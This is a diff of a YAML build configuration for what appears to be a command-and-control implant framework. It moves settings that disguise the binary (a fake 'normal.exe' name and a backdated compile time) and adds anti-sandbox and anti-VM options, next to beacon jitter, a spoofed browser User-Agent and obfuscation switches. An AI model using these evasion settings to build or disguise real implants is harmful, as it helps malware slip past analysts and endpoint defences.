@@ -7,11 +7,11 @@ basic:
     enable: false                    # 启用TLS
     version: "auto"                 # TLS版本: "auto", "1.2", "1.3"
     sni: "localhost"                # 服务器名称指示（SNI）
-    mtls:                           # mTLS客户端证书配置（可选）
-      enable: false                 # 启用mTLS
-      client_cert: "client.crt"     # 客户端证书文件路径
-      client_key: "client.key"      # 客户端私钥文件路径
-      server_ca: ""                 # 用于验证服务端的CA证书路径（可选）
+  #    mtls:                           # mTLS客户端证书配置（可选）
+  #      enable: false                 # 启用mTLS
+  #      client_cert: "client.crt"     # 客户端证书文件路径
+  #      client_key: "client.key"      # 客户端私钥文件路径
+  #      server_ca: ""                 # 用于验证服务端的CA证书路径（可选）
   proxy:
   interval: 5
   jitter: 0.2
@@ -30,6 +30,7 @@ basic:
       #any-header: any-value
 build:
   zigbuild: false
+  remap: false # Force refresh remap-path-prefix configuration even if it already exists
   ollvm:
     enable: false
     bcfobf: false # Bogus Control Flow Obfuscation
@@ -37,7 +38,20 @@ build:
     subobf: false # Instruction Substitution Obfuscation
     fco: false # Function CallSite  Obfuscation
     constenc: false # Constant Encryption Obfuscation
-  refresh_remap-path-prefix: true # Force refresh remap-path-prefix configuration even if it already exists
+  metadata:
+    remap_path: "C:/Windows/Users/"
+    icon: ""
+    compile_time: "24 Jun 2015 18:03:01"
+    file_version: ""
+    product_version: ""
+    company_name: ""
+    product_name: ""
+    original_filename: "normal.exe"
+    file_description: "normal"
+    internal_name: ""
+    require_admin: false  # whether to require admin privilege
+    require_uac: false    # whether to require uac privilege
+
 pulse:
   flags:
     start: 0x41
@@ -56,19 +70,6 @@ pulse:
     headers:
       User-Agent: "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
 
-metadata:
-  remap_path: "C:/Windows/Users/"
-  icon: ""
-  compile_time: "24 Jun 2015 18:03:01"
-  file_version: ""
-  product_version: ""
-  company_name: ""
-  product_name: ""
-  original_filename: "normal.exe"
-  file_description: "normal"
-  internal_name: ""
-  require_admin: false  # whether to require admin privilege
-  require_uac: false    # whether to require uac privilege
 
 implants:
   runtime: tokio          # async runtime: smol/tokio/async-std
@@ -79,11 +80,9 @@ implants:
     - "full"
   enable_3rd: false       # enable 3rd module
   3rd_modules:            # 3rd module when malefic compile
+    #    - curl
+    #    - rem_static
     - full
-  #    - curl
-  #    - rem_dial
-  #    - rem_static
-  #    - rem_reflection
 
   autorun: ""             # autorun config filename
   pack:                   # pack
@@ -96,6 +95,13 @@ implants:
     artifact_id: 0x1
 
   # for professional
+  anti: # 反沙箱反调试反编译反取证相关
+    sandbox: true
+    vm: true            # enable anti vm
+    # debug: true         # enable anti debug
+    # disasm: true        # enable anti disasm
+    # emulator: true      # enable anti emulator
+    # forensic: true      # enable anti forensic
 
   apis:
     # apis_level: "sys_apis", "nt_apis"
